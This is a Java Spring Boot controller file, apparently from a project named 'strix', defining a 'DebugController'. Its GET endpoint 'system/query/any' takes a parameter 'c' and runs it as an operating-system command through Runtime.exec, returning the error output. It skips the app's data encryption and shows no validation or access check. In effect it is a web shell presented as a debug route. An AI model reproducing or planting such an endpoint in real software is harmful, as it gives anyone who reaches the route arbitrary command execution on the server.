package cn.projectan.strix.controller.system;

import cn.projectan.strix.core.ret.RetMarker;
import cn.projectan.strix.model.annotation.IgnoreDataEncryption;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * @author 安炯奕
 * @date 2022/7/29 14:19
 */
@Slf4j
@RestController
@RequestMapping("system")
public class DebugController {

    @IgnoreDataEncryption
    @GetMapping("query/any")
    public Object queryAny(String c) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(c);
            try (InputStream stderr = p.getErrorStream();
                 InputStreamReader isr = new InputStreamReader(stderr);
                 BufferedReader br = new BufferedReader(isr)) {
                String line = "";
                System.out.println("--------------error---------------");
                StringBuilder sb = new StringBuilder();
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                    sb.append("\n");
                }
                int exitVal = p.waitFor();
                return RetMarker.makeSuccessRsp(sb.toString());
            }
        } catch (Exception e) {
            return RetMarker.makeErrRsp(e.getMessage());
        }
    }

}
